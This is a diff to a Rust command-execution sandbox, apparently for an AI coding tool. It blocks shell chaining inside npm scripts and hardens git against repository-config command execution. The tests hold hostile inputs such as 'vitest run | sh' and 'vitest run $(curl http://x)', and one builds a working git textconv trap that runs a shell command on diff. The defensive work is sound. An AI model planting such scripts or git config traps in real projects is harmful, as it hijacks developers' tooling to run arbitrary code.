@@ -137,10 +137,19 @@ fn is_safe_filter(arg: &str) -> bool {
     true
 }
 
-/// npm 脚本白名单（与前端 tools.ts 的 SAFE_SCRIPT_SEGMENT 保持一致）：
+/// npm 脚本里绝不允许出现的构造。
+///
+/// 为什么不能只靠"切段 + 首词白名单"：npm 用 shell 执行脚本，shell 的元字符远不止
+/// `&& || ;`。`vitest run | sh`、`vitest run & curl x`、`vitest run $(curl x)`、
+/// 反引号、重定向、换行续接，首词都还是 `vitest`，白名单会照放——而实际执行的
+/// 已经是另一条命令。所以先做构造级拒绝，再谈切段。
+const SCRIPT_FORBIDDEN: [char; 7] = ['$', '`', '>', '<', '\n', '\r', '\0'];
+
+/// npm 脚本白名单（与前端 tools.ts 的 SCRIPT_FORBIDDEN / SAFE_SCRIPT_SEGMENT 保持一致）：
 /// `npm test` / `npm run <script>` 真正执行的是 package.json 里写死的脚本，
-/// argv 白名单审不到这一层，脚本本身可能正是模型写的。落 subprocess 之前
-/// 按 && / || / ; 切段，每段首词必须是已知测试/构建运行器，否则拒绝。
+/// argv 白名单审不到这一层，脚本本身可能正是模型写的。落 subprocess 之前先拒绝
+/// 命令替换/变量展开/重定向/换行，再按 && / || / ; / | / & 切段，
+/// 每段首词必须是已知测试/构建运行器，否则拒绝。
 fn is_safe_script_segment(seg: &str) -> bool {
     let t = seg.trim_start();
     if let Some(rest) = t.strip_prefix("node") {
@@ -157,8 +166,18 @@ fn is_safe_script_segment(seg: &str) -> bool {
 }
 
 fn is_safe_npm_script(script: &str) -> bool {
-    !script.trim().is_empty() && script.split("&&").all(is_safe_script_segment) && script.split("||").all(is_safe_script_segment)
-        && script.split(';').all(is_safe_script_segment)
+    if script.trim().is_empty() {
+        return false;
+    }
+    if script.chars().any(|c| SCRIPT_FORBIDDEN.contains(&c)) {
+        return false;
+    }
+    // 先把合法的合取/析取运算符吃掉，剩下的单字符 | 与 & 都是真正的管道/后台运行，
+    // 必须参与切段（否则 `vitest run & curl x` 会被当成一段放行）。
+    let normalized = script.replace("&&", "\u{1}").replace("||", "\u{1}");
+    normalized
+        .split(|c| c == '\u{1}' || c == ';' || c == '|' || c == '&')
+        .all(is_safe_script_segment)
 }
 
 /// 这条 argv 是否要执行 package.json 里的某个脚本；是则返回脚本名。
@@ -284,6 +303,37 @@ fn truncate(s: &str) -> (String, bool) {
     (s[..end].to_string(), true)
 }
 
+/// 计算真正要 spawn 的 argv：在用户 argv 之后追加**用户无法关闭**的安全参数。
+///
+/// 只读 git 是白名单命令，但仓库内的 `.git/config`、`.gitattributes` 也能决定 git
+/// 跑什么：`diff.<driver>.textconv`、`diff.external` 会在 `git diff` 时执行命令，
+/// `core.fsmonitor` 会在 `git status` 时执行 hook。这几项都必须由命令行强制覆盖，
+/// 不能依赖"用户没配置"这种假设。
+fn effective_argv(argv: &[String]) -> Vec<String> {
+    let mut out = argv.to_vec();
+    let cmd = strip_exec_ext(argv.first().map(String::as_str).unwrap_or("")).to_ascii_lowercase();
+    if cmd != "git" || out.len() < 2 {
+        return out;
+    }
+    // `-c` 是 git 的全局选项，必须插在子命令之前；放后面就变成子命令参数了。
+    out.insert(1, "core.fsmonitor=false".to_string());
+    out.insert(1, "-c".to_string());
+    if out.get(3).map(String::as_str) == Some("diff") {
+        out.push("--no-textconv".to_string());
+        out.push("--no-ext-diff".to_string());
+    }
+    out
+}
+
+/// 空设备：给 `GIT_CONFIG_GLOBAL` 用，断掉 `~/.gitconfig` 里的注入面
+fn null_device() -> &'static str {
+    if cfg!(windows) {
+        "NUL"
+    } else {
+        "/dev/null"
+    }
+}
+
 /// 在会话登记的工程根目录里执行一条白名单命令。调用前必须先过 is_allowed，这里会再校验一次，
 /// 绝不信任前端传进来的 argv。
 ///
@@ -304,19 +354,28 @@ pub fn run_allowed(root: &Path, argv: &[String]) -> Result<RunResult, String> {
     // Windows 上 npm / npx 得换成 PATH 里真实存在的那个文件名（多半是 .cmd），
     // 否则 Kernel 只补 .exe，spawn 直接失败。
     let spawn_name = resolve_spawn_name(argv[0].as_str());
+    let spawn_argv = effective_argv(argv);
     let mut cmd = Command::new(&spawn_name);
     let mut child: Child = cmd
-        .args(&argv[1..])
+        .args(&spawn_argv[1..])
         .current_dir(dir)
         // 单命令执行，env 只在本次 spawn 生效：git 向上找仓库到工程根即停
         // （ceiling 列出的目录本身不再被当作仓库）。
         // 不改变白名单命令的正常语义（npm/node 忽略它；工程根内/下的仓库照常只读）。
         .env("GIT_CEILING_DIRECTORIES", dir.parent().unwrap_or(dir))
+        // 只读 git 的三道环境隔离：不读系统级配置、不读用户级配置、不许交互提示、
+        // 不落 pager（pager 是可执行程序）、不抢 index.lock。
+        .env("GIT_CONFIG_NOSYSTEM", "1")
+        .env("GIT_CONFIG_GLOBAL", null_device())
+        .env("GIT_CONFIG_SYSTEM", null_device())
+        .env("GIT_TERMINAL_PROMPT", "0")
+        .env("GIT_PAGER", "cat")
+        .env("GIT_OPTIONAL_LOCKS", "0")
         .stdin(Stdio::null())
         .stdout(Stdio::piped())
         .stderr(Stdio::piped())
         .spawn()
-        .map_err(|e| format!("启动命令失败（{}）：{e}", argv.join(" ")))?;
+        .map_err(|e| format!("启动命令失败（{}）：{e}", spawn_argv.join(" ")))?;
 
     // 两个读线程并发排空管道，否则输出一多就会把子进程堵死在管道缓冲区里。
     let stdout_buf: Arc<Mutex<Vec<u8>>> = Arc::new(Mutex::new(Vec::new()));
@@ -454,6 +513,91 @@ mod tests {
     }
 
     #[test]
+    fn rejects_shell_chaining_inside_npm_script() {
+        // 首词是受信任运行器还不够：shell 元字符能把「一条 vitest」变成「vitest + 任意命令」
+        assert!(is_safe_npm_script("vitest run"));
+        assert!(is_safe_npm_script("tsc && vite build"));
+        assert!(is_safe_npm_script("node --test a.test.js"));
+        for bad in [
+            "vitest run | sh",
+            "vitest run || curl http://x",
+            "vitest run & curl http://x",
+            "vitest run ; curl http://x",
+            "vitest run $(curl http://x)",
+            "vitest run `curl http://x`",
+            "vitest run\ncurl http://x",
+            "vitest run\r\ncurl http://x",
+            "vitest run > out.txt",
+            "vitest run < in.txt",
+            "tsc && curl http://x",
+        ] {
+            assert!(!is_safe_npm_script(bad), "必须拒绝：{bad:?}");
+        }
+    }
+
+    #[test]
+    fn git_gets_non_closable_hardening_args() {
+        // 用户传什么都会被追加/前置这两组参数：仓库内配置改不动 git 的执行面
+        assert_eq!(
+            effective_argv(&argv(&["git", "diff"])),
+            argv(&["git", "-c", "core.fsmonitor=false", "diff", "--no-textconv", "--no-ext-diff"])
+        );
+        assert_eq!(
+            effective_argv(&argv(&["git", "diff", "--stat"])),
+            argv(&["git", "-c", "core.fsmonitor=false", "diff", "--stat", "--no-textconv", "--no-ext-diff"])
+        );
+        // status 不接受 diff 选项，只加 fsmonitor 开关
+        assert_eq!(effective_argv(&argv(&["git", "status"])), argv(&["git", "-c", "core.fsmonitor=false", "status"]));
+        // 非 git 命令一个字节都不动
+        assert_eq!(effective_argv(&argv(&["npm", "test"])), argv(&["npm", "test"]));
+    }
+
+    /// 真实攻击复现：仓库里的 `.gitattributes` + `diff.evil.textconv` 让 `git diff`
+    /// 执行任意命令。必须同时有**对照组**（直接 spawn git diff 会写出 marker），
+    /// 否则"没写出 marker"可能只是因为陷阱压根没触发——那就是假通过。
+    #[test]
+    fn textconv_trap_fires_directly_but_not_through_run_allowed() {
+        use std::process::Command;
+
+        let dir = std::env::temp_dir().join(format!("zxz-runx-textconv-{}", std::process::id()));
+        let _ = fs::remove_dir_all(&dir);
+        fs::create_dir_all(&dir).unwrap();
+        let git = |args: &[&str]| {
+            let out = Command::new("git")
+                .arg("-C")
+                .arg(&dir)
+                .args(args)
+                .output()
+                .expect("测试前置：本机必须能跑 git");
+            assert!(out.status.success(), "git {args:?} 失败：{}", String::from_utf8_lossy(&out.stderr));
+        };
+
+        git(&["init", "-q"]);
+        fs::write(dir.join("a.txt"), "one\n").unwrap();
+        git(&["add", "a.txt"]);
+        git(&["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "init"]);
+        // 陷阱：任何 .txt 的 diff 都要经过 textconv，而 textconv 会写 marker
+        fs::write(dir.join(".gitattributes"), "*.txt diff=evil\n").unwrap();
+        git(&["config", "diff.evil.textconv", "sh -c \"echo hit > marker.txt\""]);
+        fs::write(dir.join("a.txt"), "two\n").unwrap();
+
+        let marker = dir.join("marker.txt");
+
+        // 对照组：不经 run_allowed，陷阱必须真的触发。不触发说明用例本身失效。
+        let direct = Command::new("git").arg("-C").arg(&dir).arg("diff").output().unwrap();
+        assert!(direct.status.success());
+        assert!(marker.exists(), "对照组失效：textconv 根本没被执行，这条用例证明不了任何事");
+        fs::remove_file(&marker).unwrap();
+
+        // 被测组：同样的 diff，经 run_allowed 必须打不出 marker
+        let r = run_allowed(&dir, &argv(&["git", "diff"])).unwrap();
+        assert_eq!(r.exit_code, Some(0), "加固参数不该让 git diff 失败：{:?}", r.stderr);
+        assert!(!marker.exists(), "run_allowed 仍然被 textconv 劫持：加固参数没生效");
+
+        let _ = fs::remove_dir_all(&dir);
+    }
+
+    #[test]
     fn rejects_destructive_and_shell_meta() {
         assert!(is_allowed(&argv(&["npm", "install"])).is_err());
         assert!(is_allowed(&argv(&["npm", "publish"])).is_err());
@@ -541,6 +685,17 @@ mod tests {
         fs::write(dir.join("package.json"), r#"{"scripts":{"test":"node evil.js"}}"#).unwrap();
         let err = run_allowed(rootp, &argv(&["npm", "test"])).unwrap_err();
         assert!(err.contains("受信任"), "{err}");
+        // 首词伪装成受信任运行器、后面接管道/命令替换的，执行层同样要拒
+        for evil in [
+            r#"{"scripts":{"test":"vitest run | sh"}}"#,
+            r#"{"scripts":{"test":"vitest run & curl http://x"}}"#,
+            r#"{"scripts":{"test":"vitest run $(curl http://x)"}}"#,
+            r#"{"scripts":{"test":"vitest run\ncurl http://x"}}"#,
+        ] {
+            fs::write(dir.join("package.json"), evil).unwrap();
+            let e = run_allowed(rootp, &argv(&["npm", "test"])).unwrap_err();
+            assert!(e.contains("受信任"), "伪装脚本必须被拒：{evil} → {e}");
+        }
         fs::write(dir.join("package.json"), "{}").unwrap();
         assert!(run_allowed(rootp, &argv(&["npm", "test"])).unwrap_err().contains("没有 scripts.test"));
         fs::remove_file(dir.join("package.json")).unwrap();
